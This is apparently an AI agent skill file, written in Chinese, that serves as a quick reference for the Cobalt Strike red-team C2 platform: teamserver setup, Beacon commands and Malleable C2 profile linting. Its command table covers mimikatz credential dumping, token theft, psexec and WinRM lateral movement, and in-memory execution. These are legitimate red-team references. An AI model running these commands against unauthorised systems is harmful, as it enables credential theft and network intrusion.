---
name: cobalt-strike
description: >
  此技能适用于用户询问关于"cobalt-strike"、"执行专业红队行动"、"模拟高级威胁组织"、
  "管理多操作员团队服务器基础设施"、"执行 BOF"等问题。Cobalt Strike：商业对手模拟平台，
  使用 Beacon 植入物，支持 HTTP/S、DNS、SMB、TCP 以及可塑性 C2 配置文件。
---

# Cobalt Strike

使用 Beacon 植入物的商业对手模拟平台。

## 快速开始

```bash
./teamserver <ip> <password> [malleable-profile]
./cobaltstrike
```

## Beacon 命令

| 命令 | 用途 |
|---------|---------|
| `shell <cmd>` | 通过 cmd.exe 运行 |
| `run <cmd>` | 直接执行 |
| `powerpick <ps>` | 非托管 PowerShell |
| `execute-assembly <dll> <args>` | 内存中 .NET 执行 |
| `inline-execute <bof>` | 在 Beacon 中执行 BOF |
| `jump psexec <target> <listener>` | 通过 SMB 进行横向移动 (Lateral Movement) |
| `jump winrm64 <target> <listener>` | 通过 WinRM 进行横向移动 |
| `steal_token <pid>` | 令牌模拟 |
| `mimikatz sekurlsa::logonpasswords` | Kiwi 凭据提取 (Credential Extraction) |
| `socks 1080` | SOCKS 代理 |
| `rportfwd <lp> <host> <rp>` | 反向端口转发 |

## 可塑性 C2（Malleable C2）

配置文件修改 Beacon 的网络指纹。关键部分：`http-get`、`http-post`、`stage`、`process-inject`。

```bash
./c2lint malleable-profile.profile
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | Aggressor Script、BOF 开发、可塑性配置文件示例 |
